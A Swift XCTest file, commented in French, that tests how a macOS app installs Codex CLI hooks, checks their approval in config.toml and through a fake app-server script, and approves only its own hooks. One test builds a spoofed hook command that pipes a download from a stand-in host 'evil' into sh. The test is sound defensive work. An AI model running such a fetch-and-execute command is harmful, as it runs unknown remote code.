import Foundation
import XCTest
@testable import Oriel

/// Le parcours « hooks posés -> approuvés dans Codex -> actifs » avec des doubles : faux ~/.codex (hooks.json et
/// config.toml factices, avec et sans `trusted_hash`), fausse réponse d'app-server, faux exécutable `codex`.
/// Rien n'est lu ni écrit dans le vrai ~/.codex, aucun vrai Codex n'est lancé.
final class CodexApprovalFlowTests: XCTestCase {
    private var dir: URL!
    private var bundled: URL!

    override func setUpWithError() throws {
        dir = try makeTemporaryDirectory(self).appendingPathComponent(".codex")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        bundled = dir.deletingLastPathComponent().appendingPathComponent("bundle-codex-notch-hook.sh")
        try "#!/bin/sh\nexit 0\n".write(to: bundled, atomically: true, encoding: .utf8)
    }

    private var installer: CodexHookInstaller { CodexHookInstaller(configDirectory: dir, bundledHook: bundled) }
    private var configFile: URL { dir.appendingPathComponent("config.toml") }

    /// `[hooks.state."<clé>"] trusted_hash = …` pour chacune des clés, comme le fait Codex.
    private func trust(_ keys: [String]) throws {
        let text = keys.map { "[hooks.state.\(CodexAppServer.tomlQuoted($0))]\ntrusted_hash = \"sha256:aa\"\n" }.joined(separator: "\n")
        try text.write(to: configFile, atomically: true, encoding: .utf8)
    }

    /// Ce que Codex liste pour nos hooks installés, avec l'avis `status(événement)`.
    private func listed(_ status: (String) -> String = { _ in "untrusted" }) throws -> [CodexListedHook] {
        let installer = self.installer
        return CodexHookInstaller.events.enumerated().map { index, event in
            CodexListedHook(key: "\(installer.hooksURL.path):\(CodexHookInstaller.snake(event)):\(index):0",
                            command: installer.hookCommand + (event == "PermissionRequest" ? " permission" : ""),
                            sourcePath: installer.hooksURL.path, trustStatus: status(event), currentHash: "sha256:\(index)",
                            enabled: true)
        }
    }

    // MARK: - config.toml factice (lecture seule)

    func testConfigWithoutTrustedHashMeansEightHooksToApprove() throws {
        try installer.install()
        XCTAssertEqual(installer.unapprovedCount(), 8, "pas de config.toml")
        try "model = \"x\"\n[features]\nhooks = true\n".write(to: configFile, atomically: true, encoding: .utf8)
        XCTAssertEqual(installer.unapprovedCount(), 8, "config.toml sans hooks.state")
    }

    func testConfigWithTrustedHashesMeansApproved() throws {
        try installer.install()
        let keys = installer.hookKeys()
        XCTAssertEqual(keys.count, 8)
        try trust(keys)
        XCTAssertEqual(installer.unapprovedCount(), 0)
        try trust(Array(keys.dropLast(2)))
        XCTAssertEqual(installer.unapprovedCount(), 2, "deux hooks sans approbation")
    }

    func testAnEntryWithoutTrustedHashIsNotApproved() throws {
        try installer.install()
        let key = try XCTUnwrap(installer.hookKeys().first)
        // `enabled` seul (réglage de l'utilisateur) n'est pas une approbation.
        try "[hooks.state.\(CodexAppServer.tomlQuoted(key))]\nenabled = false\n".write(to: configFile, atomically: true, encoding: .utf8)
        XCTAssertEqual(installer.unapprovedCount(), 8)
    }

    func testHookKeysFollowGroupAndRankInHooksJson() throws {
        let theirs = #"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"/usr/bin/true"}]},"#
            + #"{"matcher":"Bash","hooks":[{"type":"command","command":"/bin/echo"}]}]}}"#
        try theirs.write(to: dir.appendingPathComponent("hooks.json"), atomically: true, encoding: .utf8)
        try installer.install()
        let keys = installer.hookKeys()
        XCTAssertTrue(keys.contains("\(installer.hooksURL.path):pre_tool_use:2:0"), "après les deux groupes de l'utilisateur")
        XCTAssertTrue(keys.contains("\(installer.hooksURL.path):permission_request:0:0"))
        XCTAssertTrue(keys.contains("\(installer.hooksURL.path):session_end:0:0"))
        XCTAssertEqual(CodexHookInstaller.events.map(CodexHookInstaller.snake),
                       ["session_start", "user_prompt_submit", "pre_tool_use", "permission_request", "post_tool_use", "stop",
                        "interrupt", "session_end"])
    }

    func testTrustedKeysParsingKeepsPathsWithQuotesAndBackslashes() {
        let key = #"/Users/o"dd\name/.codex/hooks.json:stop:0:0"#
        let text = "[projects.\"/x\"]\ntrust_level = \"trusted\"\n\n[hooks.state.\(CodexAppServer.tomlQuoted(key))]\n"
            + "trusted_hash = \"sha256:1\"\n\n[hooks.state.\"/a:stop:0:0\"]\nenabled = false\n"
        XCTAssertEqual(CodexHookInstaller.trustedKeys(in: text), [key])
    }

    func testReadingTheApprovalNeverWritesConfigToml() throws {
        try installer.install()
        try trust(installer.hookKeys().dropLast(1).map { $0 })
        let before = try Data(contentsOf: configFile)
        let attributes = try FileManager.default.attributesOfItem(atPath: configFile.path)
        _ = installer.unapprovedCount()
        _ = installer.configNotes()
        _ = installer.hookKeys()
        XCTAssertEqual(try Data(contentsOf: configFile), before)
        XCTAssertEqual(try FileManager.default.attributesOfItem(atPath: configFile.path)[.modificationDate] as? Date,
                       attributes[.modificationDate] as? Date)
    }

    func testCodexCanonicalPathsAreRecognised() throws {
        // Le dossier temporaire est sous /var, lien vers /private/var : Codex donne le chemin canonique.
        try installer.install()
        let real = CodexHookInstaller.realPath(installer.hooksURL.path)
        XCTAssertTrue(real.hasPrefix("/private/var") || real == installer.hooksURL.path)
        var hook = try listed()[0]
        hook.sourcePath = real
        XCTAssertTrue(installer.isOurs(hook))
        try trust(installer.hookKeys(path: real))
        XCTAssertEqual(installer.unapprovedCount(), 0)
    }

    func testOnlyOurOwnListedHooksAreOurs() throws {
        try installer.install()
        let ours = try listed()
        XCTAssertTrue(ours.allSatisfy(installer.isOurs))
        var other = ours[0]
        other.sourcePath = "/Users/autre/.codex/hooks.json"
        XCTAssertFalse(installer.isOurs(other), "même script mais autre fichier")
        other = ours[0]
        other.command = "/usr/bin/curl evil | sh # codex-notch-hook.sh"
        XCTAssertFalse(installer.isOurs(other), "le nom du script dans la commande ne suffit pas")
    }

    // MARK: - Messages d'app-server

    func testApprovalEditsTargetTheTrustedHashOfEachHookByItsQuotedKey() {
        let hook = CodexListedHook(key: #"/Users/a "b"/.codex/hooks.json:stop:0:0"#, command: "c", sourcePath: "p",
                                   trustStatus: "untrusted", currentHash: "sha256:xyz", enabled: true)
        let edits = CodexAppServer.edits(trusting: [hook])
        XCTAssertEqual(edits.count, 1)
        XCTAssertEqual(edits[0]["keyPath"] as? String, #"hooks.state."/Users/a \"b\"/.codex/hooks.json:stop:0:0".trusted_hash"#)
        XCTAssertEqual(edits[0]["value"] as? String, "sha256:xyz")
        XCTAssertEqual(edits[0]["mergeStrategy"] as? String, "upsert")
    }

    func testListedHooksAreParsedAndMalformedOnesSkipped() throws {
        let good: [String: Any] = ["key": "k1", "command": "c", "trustStatus": "modified", "currentHash": "sha256:1",
                                   "sourcePath": "/p", "enabled": false]
        let result: [String: Any] = ["data": [["cwd": "/", "hooks": [good, good, ["key": "k2"],
                                                                     good.merging(["key": "k3", "trustStatus": "managed"]) { $1 }]]]]
        let hooks = try CodexAppServer.parse(result)
        XCTAssertEqual(hooks.map(\.key), ["k1", "k3"], "doublon et entrée incomplète ignorés")
        XCTAssertEqual(hooks[0].trustStatus, "modified")
        XCTAssertFalse(hooks[0].isTrusted)
        XCTAssertFalse(hooks[0].enabled)
        XCTAssertTrue(hooks[1].isTrusted, "géré par l'administrateur")
        XCTAssertThrowsError(try CodexAppServer.parse(["nope": 1]))
    }

    func testBinaryLookupPrefersTheAppThenTheCommand() throws {
        let root = try makeTemporaryDirectory(self)
        let app = root.appendingPathComponent("ChatGPT.app")
        let inApp = app.appendingPathComponent("Contents/Resources/codex-cli/CodexCLI.app/Contents/MacOS/codex")
        let cli = root.appendingPathComponent(".local/bin/codex")
        for url in [inApp, cli] {
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try "#!/bin/sh\n".write(to: url, atomically: true, encoding: .utf8)
            try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: url.path)
        }
        XCTAssertEqual(CodexBinary.find(appURL: app, home: root), inApp)
        XCTAssertEqual(CodexBinary.find(appURL: nil, home: root), cli)
    }

    // MARK: - Faux exécutable `codex app-server`

    /// Script qui répond comme app-server : `initialize`, `hooks/list` (liste « avant », puis « après » une écriture),
    /// `config/batchWrite`. Journalise les lignes reçues. `mode` change son comportement.
    private func fakeCodex(mode: String = "ok", before: [CodexListedHook], after: [CodexListedHook]? = nil) throws -> URL {
        func json(_ hooks: [CodexListedHook]) throws -> String {
            let entries = hooks.map { ["key": $0.key, "command": $0.command, "sourcePath": $0.sourcePath,
                                       "trustStatus": $0.trustStatus, "currentHash": $0.currentHash, "enabled": $0.enabled] as [String: Any] }
            let data = try JSONSerialization.data(withJSONObject: ["data": [["cwd": "/", "hooks": entries, "errors": [], "warnings": []]]])
            return String(decoding: data, as: UTF8.self)
        }
        try json(before).write(to: dir.appendingPathComponent("list-before.json"), atomically: true, encoding: .utf8)
        try json(after ?? before).write(to: dir.appendingPathComponent("list-after.json"), atomically: true, encoding: .utf8)
        let script = dir.deletingLastPathComponent().appendingPathComponent("fake-codex-\(mode)")
        let body = """
        #!/bin/sh
        # args: $1 = app-server ; CODEX_HOME = dossier du test
        [ "$1" = app-server ] || exit 2
        while IFS= read -r line; do
          printf '%s\\n' "$line" >> "$CODEX_HOME/received.log"
          id=$(printf '%s' "$line" | sed -E 's/.*"id":([0-9]+).*/\\1/')
          case "$line" in
            *'"initialize"'*) [ "\(mode)" = silent ] && exec sleep 30; printf '{"id":%s,"result":{"codexHome":"x"}}\\n' "$id" ;;
            *'"hooks/list"'*)
              if [ -e "$CODEX_HOME/written" ]; then f=list-after.json; else f=list-before.json; fi
              if [ "\(mode)" = broken ]; then printf '{"id":%s,"error":{"message":"boom"}}\\n' "$id"; else
              printf '{"id":%s,"result":%s}\\n' "$id" "$(cat "$CODEX_HOME/$f")"; fi ;;
            *'"config/batchWrite"'*)
              touch "$CODEX_HOME/written"
              if [ "\(mode)" = overridden ]; then printf '{"id":%s,"result":{"status":"okOverridden"}}\\n' "$id"
              else printf '{"id":%s,"result":{"status":"ok","version":"v","filePath":"x"}}\\n' "$id"; fi ;;
          esac
        done
        """
        try body.write(to: script, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: script.path)
        return script
    }

    private func received() -> [String] {
        ((try? String(contentsOf: dir.appendingPathComponent("received.log"), encoding: .utf8)) ?? "")
            .split(separator: "\n").map(String.init)
    }

    func testListingHooksThroughAFakeAppServer() throws {
        try installer.install()
        let server = CodexAppServer(executable: try fakeCodex(before: try listed()), home: dir, timeout: 10)
        let hooks = try server.hooks(approving: nil)
        XCTAssertEqual(hooks.count, 8)
        XCTAssertTrue(hooks.allSatisfy { $0.trustStatus == "untrusted" })
        let lines = received()
        XCTAssertEqual(lines.count, 3, "initialize, initialized, hooks/list : \(lines)")
        XCTAssertTrue(lines.contains { $0.contains("hooks/list") })
        XCTAssertFalse(lines.contains { $0.contains("batchWrite") }, "lire ne write rien")
    }

    func testApprovingWritesOnlyTheHooksTheCallerAccepts() throws {
        try installer.install()
        let before = try listed()
        var foreign = before[0]
        foreign.key = "/Users/autre/.codex/hooks.json:stop:0:0"
        foreign.command = "/usr/bin/true"
        let after = try listed { _ in "trusted" } + [foreign]
        let server = CodexAppServer(executable: try fakeCodex(before: before + [foreign], after: after), home: dir, timeout: 10)
        let installer = self.installer
        let hooks = try server.hooks(approving: { installer.isOurs($0) })
        let write = try XCTUnwrap(received().first { $0.contains("config/batchWrite") })
        XCTAssertEqual(write.components(separatedBy: "trusted_hash").count - 1, 8, "nos huit hooks")
        XCTAssertFalse(write.contains("/Users/autre"), "le hook d'un autre n'est jamais approuvé")
        XCTAssertEqual(hooks.filter(installer.isOurs).filter(\.isTrusted).count, 8, "liste relue après l'écriture")
        XCTAssertEqual(hooks.first { $0.key.hasPrefix("/Users/autre") }?.trustStatus, "untrusted")
    }

    func testAlreadyTrustedHooksAreNotWrittenAgain() throws {
        try installer.install()
        let server = CodexAppServer(executable: try fakeCodex(before: try listed { _ in "trusted" }), home: dir, timeout: 10)
        let installer = self.installer
        _ = try server.hooks(approving: { installer.isOurs($0) })
        XCTAssertFalse(received().contains { $0.contains("batchWrite") })
    }

    func testAppServerFailures() throws {
        try installer.install()
        let list = try listed()
        let broken = CodexAppServer(executable: try fakeCodex(mode: "broken", before: list), home: dir, timeout: 10)
        XCTAssertThrowsError(try broken.hooks(approving: nil)) { XCTAssertEqual($0 as? CodexServiceError, .failure("boom")) }

        let overridden = CodexAppServer(executable: try fakeCodex(mode: "overridden", before: list), home: dir, timeout: 10)
        XCTAssertThrowsError(try overridden.hooks(approving: { _ in true })) {
            XCTAssertEqual($0 as? CodexServiceError, .overridden)
        }

        let started = Date()
        let silent = CodexAppServer(executable: try fakeCodex(mode: "silent", before: list), home: dir, timeout: 1)
        XCTAssertThrowsError(try silent.hooks(approving: nil)) { XCTAssertEqual($0 as? CodexServiceError, .timeout) }
        XCTAssertLessThan(Date().timeIntervalSince(started), 8, "le processus muet est arrêté à l'échéance")

        let missing = CodexAppServer(executable: dir.appendingPathComponent("absent"), home: dir)
        XCTAssertThrowsError(try missing.hooks(approving: nil)) {
            guard case .launch = $0 as? CodexServiceError else { return XCTFail("\($0)") }
        }
    }

    // MARK: - Parcours (CodexHookSetup avec un double)

    private final class StubService: CodexHooksService {
        var hooks: [CodexListedHook]
        var error: Error?
        private(set) var calls = 0
        private(set) var approvedKeys: [String] = []

        init(_ hooks: [CodexListedHook]) { self.hooks = hooks }

        func hooks(approving: ((CodexListedHook) -> Bool)?) throws -> [CodexListedHook] {
            calls += 1
            if let error { throw error }
            if let approving {
                for index in hooks.indices where !hooks[index].isTrusted && approving(hooks[index]) {
                    approvedKeys.append(hooks[index].key)
                    hooks[index].trustStatus = "trusted"
                }
            }
            return hooks
        }
    }

    private func setup(service: CodexHooksService?, watchInterval: TimeInterval = 2.5) -> CodexHookSetup {
        let installer = self.installer
        let setup = CodexHookSetup(installer: { installer }, service: { _ in service }, watchInterval: watchInterval)
        setup.refresh()
        return setup
    }

    private func settle(_ setup: CodexHookSetup, file: StaticString = #filePath, line: UInt = #line) {
        XCTAssertTrue(spin { !setup.isWorking }, "demande à Codex terminée", file: file, line: line)
    }

    func testFlowFollowsTheFilesThenWhatCodexSays() throws {
        let stub = StubService(try listed())
        let setup = setup(service: stub)
        XCTAssertEqual(setup.flow, .notInstalled)

        try installer.install()
        setup.refresh()
        XCTAssertEqual(setup.flow, .pendingApproval(8), "posés, config.toml sans approbation : pas actifs")
        XCTAssertTrue(setup.canApprove)

        stub.hooks = try listed { _ in "trusted" }
        setup.verify(force: true)
        settle(setup)
        XCTAssertEqual(setup.flow, .active)
        XCTAssertFalse(setup.canApprove)
        XCTAssertEqual(stub.calls, 1)
        XCTAssertEqual(stub.approvedKeys, [], "vérifier n'approuve jamais rien")
    }

    func testCodexOverridesTheEstimateWhenAHookWasModified() throws {
        try installer.install()
        try trust(installer.hookKeys())
        let stub = StubService(try listed { $0 == "Stop" ? "modified" : "trusted" })
        let setup = setup(service: stub)
        XCTAssertEqual(setup.flow, .active, "config.toml dit approuvé")
        setup.verify(force: true)
        settle(setup)
        XCTAssertEqual(setup.flow, .pendingApproval(1), "mais Codex voit un hook modifié depuis")
    }

    func testApproveAsksCodexToTrustOnlyOurHooksAfterAnExplicitCall() throws {
        try installer.install()
        let mine = try listed()
        var foreign = mine[0]
        foreign.key = "/Users/autre/.codex/hooks.json:stop:0:0"
        foreign.command = "/usr/bin/true"
        foreign.sourcePath = "/Users/autre/.codex/hooks.json"
        let stub = StubService(mine + [foreign])
        let setup = setup(service: stub)
        XCTAssertEqual(stub.calls, 0, "refresh lit les fichiers, il n'appelle pas Codex")

        setup.approve()
        XCTAssertTrue(setup.isWorking)
        settle(setup)
        XCTAssertEqual(Set(stub.approvedKeys), Set(mine.map(\.key)), "nos huit hooks")
        XCTAssertFalse(stub.approvedKeys.contains(foreign.key))
        XCTAssertEqual(setup.flow, .active)
        XCTAssertEqual(setup.messageIsError, false)
        XCTAssertEqual(setup.message, L("Hooks approuvés. Ouvre une nouvelle conversation Codex pour les voir à l'œuvre.", table: "Codex"))
        XCTAssertFalse(FileManager.default.fileExists(atPath: configFile.path), "l'app n'écrit jamais config.toml elle-même")

        setup.approve()
        XCTAssertFalse(setup.isWorking)
        XCTAssertEqual(stub.calls, 1, "plus rien à approuver : pas de seconde demande")
    }

    func testApproveDoesNothingUntilTheHooksAreCurrent() throws {
        let stub = StubService(try listed())
        let setup = setup(service: stub)
        setup.approve()
        XCTAssertEqual(stub.calls, 0, "hooks non posés")

        try installer.install()
        // Entrées modifiées à la main : à mettre à jour d'abord (Codex les verrait comme modifiées).
        var file = try XCTUnwrap(JSONSerialization.jsonObject(with: Data(contentsOf: installer.hooksURL)) as? [String: Any])
        var hooks = try XCTUnwrap(file["hooks"] as? [String: Any])
        var groups = try XCTUnwrap(hooks["Stop"] as? [[String: Any]])
        var inner = try XCTUnwrap(groups[0]["hooks"] as? [[String: Any]])
        inner[0]["timeout"] = 99
        groups[0]["hooks"] = inner
        hooks["Stop"] = groups
        file["hooks"] = hooks
        try JSONSerialization.data(withJSONObject: file).write(to: installer.hooksURL)
        setup.refresh()
        XCTAssertEqual(setup.flow, .needsUpdate)
        setup.approve()
        XCTAssertEqual(stub.calls, 0)
    }

    func testFailuresAreShownAndNeverPretendToSucceed() throws {
        try installer.install()
        let stub = StubService(try listed())
        stub.error = CodexServiceError.timeout
        let setup = setup(service: stub)
        setup.approve()
        settle(setup)
        XCTAssertEqual(setup.flow, .pendingApproval(8))
        XCTAssertEqual(setup.messageIsError, true)
        XCTAssertEqual(setup.message, CodexServiceError.timeout.localizedDescription)

        let without = self.setup(service: nil)
        without.verify()
        XCTAssertNil(without.message, "une vérification automatique sans Codex reste silencieuse")
        without.approve()
        XCTAssertEqual(without.message, CodexServiceError.noCodex.localizedDescription)
        XCTAssertEqual(without.messageIsError, true)

        // Codex ne voit aucun de nos hooks (réglage coupé, fichier refusé) : on garde l'estimation et on le dit.
        let blind = self.setup(service: StubService([]))
        blind.approve()
        settle(blind)
        XCTAssertEqual(blind.flow, .pendingApproval(8))
        XCTAssertEqual(blind.messageIsError, true)
    }

    func testHooksTurnedOffInConfigAreReportedAsSuch() throws {
        try installer.install()
        try "[features]\nhooks = false\n".write(to: configFile, atomically: true, encoding: .utf8)
        XCTAssertEqual(setup(service: nil).flow, .disabled)
    }

    func testAnEventIsTheProofThatHooksRun() throws {
        try installer.install()
        let stub = StubService(try listed())
        let setup = setup(service: stub)
        XCTAssertEqual(setup.flow, .pendingApproval(8))
        setup.markActive()
        XCTAssertEqual(setup.flow, .active)
        setup.refresh()
        XCTAssertEqual(setup.flow, .active, "une relecture ne contredit pas un événement reçu")
        setup.verify()
        XCTAssertEqual(stub.calls, 0, "inutile d'interroger Codex")
        setup.forgetProof()
        XCTAssertEqual(setup.flow, .pendingApproval(8))
    }

    func testAutomaticChecksAreThrottled() throws {
        try installer.install()
        let stub = StubService(try listed())
        let setup = setup(service: stub)
        setup.verify()
        settle(setup)
        setup.verify()
        setup.verify()
        XCTAssertEqual(stub.calls, 1, "30 s minimum tant que l'approbation est attendue")
        setup.verify(force: true)
        settle(setup)
        XCTAssertEqual(stub.calls, 2, "le bouton Vérifier passe outre")
    }

    func testTheTabUpdatesByItselfWhenTheHooksGetApprovedElsewhere() throws {
        try installer.install()
        let setup = setup(service: nil, watchInterval: 0.05)
        XCTAssertEqual(setup.flow, .pendingApproval(8))
        XCTAssertFalse(setup.isWatching, "rien ne tourne tant qu'aucune vue n'est affichée")
        setup.watch(true)
        XCTAssertTrue(setup.isWatching)

        // L'utilisateur approuve ailleurs (/hooks dans le terminal, « Review hooks » dans l'app) : Codex écrit config.toml.
        try trust(installer.hookKeys())
        XCTAssertTrue(spin { setup.flow == .active }, "relu tout seul")
        XCTAssertTrue(spin { !setup.isWatching }, "plus de veille une fois actifs")
        setup.watch(false)
        XCTAssertFalse(setup.isWatching)
    }

    func testWatchStopsWhenTheLastViewDisappears() throws {
        try installer.install()
        let setup = setup(service: nil)
        setup.watch(true)
        setup.watch(true)
        setup.watch(false)
        XCTAssertTrue(setup.isWatching, "une vue est encore affichée")
        setup.watch(false)
        XCTAssertFalse(setup.isWatching)
        setup.watch(false)
        XCTAssertFalse(setup.isWatching, "jamais négatif")
    }

    func testUnderXCTestTheRealCodexIsNeverStarted() {
        XCTAssertNil(CodexHookSetup.standardService(installer))
    }

    // MARK: - Textes de chaque étape

    func testEachStepSaysWhatToDo() {
        func content(_ flow: CodexHookSetup.Flow, message: String? = nil, error: Bool = false) -> CodexSetupState.Content {
            CodexSetupState.content(for: flow, message: message, messageIsError: error)
        }
        XCTAssertEqual(content(.notInstalled).action, .settings)
        XCTAssertEqual(content(.needsUpdate).action, .settings)
        XCTAssertNil(content(.disabled).action)
        let pending = content(.pendingApproval(8))
        XCTAssertEqual(pending.action, .approve)
        XCTAssertTrue(pending.warning)
        XCTAssertTrue(pending.detail.contains("1.") && pending.detail.contains("2."), "deux étapes numérotées")
        XCTAssertTrue(pending.detail.contains("ChatGPT"), "l'app ChatGPT est citée")
        let active = content(.active)
        XCTAssertNil(active.action)
        XCTAssertTrue(active.detail.contains("nouvelle conversation"))
        XCTAssertEqual(content(.active, message: "Hooks approuvés.").detail, "Hooks approuvés.")
        XCTAssertNotEqual(content(.active, message: "boom", error: true).detail, "boom", "une erreur ne remplace pas la consigne")
    }

    // MARK: - Ouvrir une session de l'app ChatGPT

    func testChatGPTAppSessionsOpenTheirOwnConversation() {
        let id = "0198f1d3-7c2a-7a51-9d6e-3b1f5c8a2e44"
        var session = CodexSession(id: id, cwd: "/Users/demo/Documents/Codex/2026-10-21/site")
        session.hostBundleId = "com.openai.codex"
        session.hostName = "ChatGPT"
        XCTAssertEqual(CodexModule.deepLink(for: session), URL(string: "codex://threads/\(id)"))
        XCTAssertEqual(session.sourceLabel, "ChatGPT")

        session.hostBundleId = "com.apple.Terminal"
        XCTAssertNil(CodexModule.deepLink(for: session), "terminal : on ramène l'app devant, sans lien")

        var odd = CodexSession(id: "pas-un-uuid", cwd: nil)
        odd.hostBundleId = "com.openai.codex"
        XCTAssertNil(CodexModule.deepLink(for: odd))
    }

    func testActivatingASessionPassesTheLinkToTheHost() {
        let id = "0198f1d3-7c2a-7a51-9d6e-3b1f5c8a2e44"
        let module = CodexModule(setup: setup(service: nil), defaults: makeEphemeralDefaults(self))
        var opened: [(String?, URL?)] = []
        module.openHost = { opened.append(($0, $1)) }
        var app = CodexSession(id: id, cwd: nil)
        app.hostBundleId = "com.openai.codex"
        module.activate(app)
        var terminal = CodexSession(id: "x", cwd: nil)
        terminal.hostBundleId = "com.googlecode.iterm2"
        module.activate(terminal)
        XCTAssertEqual(opened.map { $0.0 }, ["com.openai.codex", "com.googlecode.iterm2"])
        XCTAssertEqual(opened.map { $0.1 }, [URL(string: "codex://threads/\(id)"), nil])
    }
}
